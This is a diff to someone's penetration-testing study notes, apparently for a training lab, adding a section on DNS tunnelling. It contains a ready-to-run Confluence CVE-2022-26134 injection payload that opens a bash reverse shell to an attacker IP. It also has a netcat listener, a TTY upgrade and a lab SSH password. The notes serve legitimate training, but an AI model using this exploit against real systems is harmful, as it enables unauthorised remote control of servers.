@@ -3080,7 +3080,19 @@ Reference
     - chisel terminal > proxy#R:127.0.0.1:1080=>socks: Listening  
     - connect to DB port 8008 through a SOCKS proxy using proxychains.  
       `proxychains ./chisel_exercise_client -i 10.4.126.215 -p 8008`
-- DNS tunnelling with dnscat2
+- DNS tunnelling fundamental
+  - From CONFLUENCE01 or PGDATABASE01, make a TXT record request for give-me.cat-facts.internal, using MULTISERVER03 as the DNS resolver
+  - `nc -nvlp 4444`
+  - get reserve shell from confluence CVE-2022-26134. change confluence server and kali ip
+    `curl http://192.168.164.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/`
+  - reverse shell TTY to PGDATABASE01 and login as database_admin
+    ```
+    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+    ssh database_admin@10.4.164.215 pass: sqlpass123
+    ```
+  - The TXT record response from give-me.cat-facts.internal
+    `database_admin@pgdatabase01:~$ nslookup -type=txt give-me.cat-facts.internal`
+- DNS tunneling with dnscat2
 
 ## Penetration testing report 
 - note editor:
